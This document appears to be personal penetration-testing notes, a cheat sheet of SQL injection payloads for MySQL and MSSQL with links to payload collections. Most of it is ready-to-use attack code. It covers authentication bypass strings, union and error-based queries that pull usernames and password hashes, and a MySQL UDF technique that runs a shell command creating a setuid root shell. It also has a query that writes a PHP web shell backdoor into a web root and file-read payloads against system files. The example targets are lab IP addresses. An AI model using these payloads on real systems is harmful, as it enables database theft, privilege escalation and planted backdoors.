
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/

http://www.securityidiots.com/Web-Pentest/SQL-Injection

https://www.tarlogic.com/en/blog/red-team-tales-0x01/


## PostGres Command Exec if Auth
https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5

## UDF
https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss

or PWK

Can transfer udf so via hex.
Dump with xxd
```
xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
```
then set variable
```
set @shell = 0x7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000e03b 0000000000000000000040003800090040001c001b000100000004000000000000...00000000000000000 000;
```

Full is below. Must place in plugin_dir
```
select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
```




## Classic Union

MSSQL
```
' union select (SELECT name FROM master..sysdatabases for xml path('')),2--
```
## Auth Bypass

MySQL
```
tom' or 1=1;#
tom' or 1=1-- MAKE SURE SPACE IS AFTER
tom' or '1'='1'-- 
```

## Column enumeration
```
id=1 order by 1
```
increase order until error to know how many columns

then you can union
```
id=1 union all select 1, 2, 3
```
see which ones show up on the page and then use that to get stuff
```
id=1 union all select 1, 2, @@version
```


## MSSQL Error Based
```
For integer inputs : convert(int,@@version)
For integer inputs : cast((SELECT @@version) as int)

For string inputs   : ' + convert(int,@@version) + '
For string inputs   : ' + cast((SELECT @@version) as int) + '
```
https://www.exploit-db.com/papers/12975
https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-(mssql).pdf

If convert isn't working try having, group by or order by
```
' HAVING 1=1;-- 
This got me tablename and column of
users.username

' GROUP BY users.username HAVING 1=1;--
ok this got me users.password_hash

' GROUP BY users.username,users.password_hash HAVING 1=1--
this got nothing theres only those 2 columns
```

## Assign column name to variable

Create table to use with column name of "col1"
```
'; create table arvin(col1 varchar(255));--
```
Declare var and replace column name with query
```
'; declare @column1 varchar(255); set @column1 = (select top 1 password_hash from users); EXEC sp_rename 'arvin.col1', @column1, 'COLUMN';-- 
```
Get the goods
```
select * from arvin where 1=1 having 1=1;
```


## Random tries

```
select * from users where name = 'tom' or 1=1 LIMIT 1;#

order results in 1 or more columns?
use to figure out how many columns in a table
http://10.11.0.22/debug.php?id=1 order by 1

shows which columns are displayed on page
http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3

now version will show in 3
http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version

now user will show in 3
http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()

get info from database through information schema table
 http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables

["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"]

get all column names from user table

 http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'



get username and password
http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users

try to read
192.168.146.10/debug.php?id=1 union all select 1, 2, load_file('c:/windows/system32/drivers/etc/hosts')

write out
 http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

http://10.11.1.73:8080/PHP/index.php?tg=delegat&idx=mem&id=1%20UNION%20ALL%20SELECT%201,2
```


